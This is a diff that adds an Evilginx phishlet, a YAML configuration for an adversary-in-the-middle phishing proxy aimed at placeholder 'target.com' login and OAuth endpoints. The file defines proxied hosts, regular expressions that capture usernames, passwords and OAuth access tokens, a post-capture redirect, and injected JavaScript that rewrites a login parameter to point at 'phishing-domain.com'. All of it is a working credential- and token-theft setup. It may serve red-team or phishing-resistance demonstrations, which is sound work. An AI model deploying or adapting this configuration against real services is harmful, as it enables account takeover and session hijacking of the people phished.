@@ -1,0 +1,42 @@
+author: '@pingtechenablement'
+min_ver: '3.0.0'
+# Where Evilginx will redirect the user after creds and tokens are captured.
+redirect_url: 'https://target.domain.com'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'target.com', session: true, is_landing: true, auto_filter: true}
+sub_filters:
+auth_tokens:
+  - domain: 'auth.target.com'
+    path: '/as/token.oauth2'
+    name: 'token'
+    search: '"access_token":"([^"]*)'
+    type: 'body'
+credentials:
+  username:
+    key: 'username'
+    search: '"identifier":"([^"]*)'
+    type: 'json'
+  password:
+    key: 'password'
+    search: '"password":"([^"]*)'
+    type: 'json'
+login:
+  domain: 'login.target.com'
+  path: '/app'
+
+# js_inject is ONLY needed if you need to extend Evilginx to handle bespoke use cases in your app.
+js_inject:
+  - trigger_domains: ["auth.target.com"]
+    trigger_paths: ["/app/","/*"]
+    trigger_params: []
+    script: |
+      (function () {
+        var queryParams = new URLSearchParams(window.location.search);
+        if (queryParams.has('TargetResource')) {
+          const targetResource = queryParams.get('TargetResource');
+          if (targetResource?.includes('.target.com')) {
+            queryParams.set('TargetResource', targetResource.replace('target.com', 'phishing-domain.com'));
+            history.replaceState(null, null, "?" + queryParams.toString());
+          }
+        } 
+      })();
